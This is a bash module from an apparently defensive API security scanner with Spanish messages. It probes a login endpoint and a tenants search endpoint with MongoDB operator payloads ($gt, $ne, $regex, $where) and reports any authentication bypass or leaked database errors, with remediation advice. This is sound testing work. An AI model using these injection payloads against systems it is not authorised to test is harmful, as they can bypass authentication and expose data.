#!/usr/bin/env bash
# NoSQL injection probes (safe, non-destructive).

run_injection() {
  log_step "Inyección NoSQL (sondas seguras)"

  if ! api_reachable; then
    log_skip "API no disponible"
    write_module_result "injection" "skipped" "API unreachable"
    return 0
  fi

  local payloads=(
    '{"email":{"$gt":""},"password":{"$gt":""}}'
    '{"email":"admin","password":{"$ne":""}}'
    '{"email":{"$regex":".*"},"password":"x"}'
  )

  local bypass_found=false
  local i=0
  for payload in "${payloads[@]}"; do
    i=$((i + 1))
    local resp code token
    resp=$(curl -s --max-time "${REQUEST_TIMEOUT_SEC:-10}" \
      -H "Content-Type: application/json" \
      -d "$payload" \
      "${TARGET_API}/api/v1/auth/login" 2>/dev/null || true)
    echo "$resp" >"${REPORT_DIR}/raw/nosql_login_${i}.json"

    if have_cmd jq; then
      token=$(echo "$resp" | jq -r '.access_token // .token // empty' 2>/dev/null)
    else
      token=$(echo "$resp" | grep -oE '"access_token"\s*:\s*"[^"]+"' | head -1 | sed 's/.*"\([^"]*\)"$/\1/' || true)
    fi

    if [[ -n "$token" && "$token" != "null" ]]; then
      bypass_found=true
      add_finding "Critical" "Injection" "Posible bypass NoSQL en login" \
        "Payload MongoDB operator devolvió token de acceso." \
        "Usar tipos estrictos en bind JSON; nunca pasar mapas sin validar a queries." \
        "OWASP API8 / A03 Injection" "payload #${i}: ${payload}"
    fi
  done

  if ! $bypass_found; then
    add_finding "Info" "Injection" "NoSQL login — sin bypass detectado" \
      "Operadores \$gt, \$ne, \$regex no produjeron autenticación exitosa." \
      "" "OWASP A03" ""
  fi

  # Search/query injection on list endpoints (with auth)
  obtain_auth_token
  token="${AUTH_TOKEN_RESULT:-}"
  if [[ -n "$token" ]]; then
    local search_payloads=(
      "?q={\"\$gt\":\"\"}"
      "?search={\"\$where\":\"1==1\"}"
    )
    for q in "${search_payloads[@]}"; do
      local code body
      code=$(http_code GET "${TARGET_API}/api/v1/tenants${q}" \
        -H "Authorization: Bearer ${token}")
      body=$(http_body GET "${TARGET_API}/api/v1/tenants${q}" \
        -H "Authorization: Bearer ${token}")

      if echo "$body" | grep -qiE 'syntax error|mongo|bson|\$where'; then
        add_finding "Medium" "Injection" "Error de query revelado en búsqueda" \
          "Parámetro de búsqueda provocó mensaje que menciona motor de BD." \
          "Sanitizar query params; mensajes de error genéricos." \
          "OWASP A03" "$body"
      fi
    done
  fi

  write_module_result "injection" "completed" "NoSQL probes done"
}
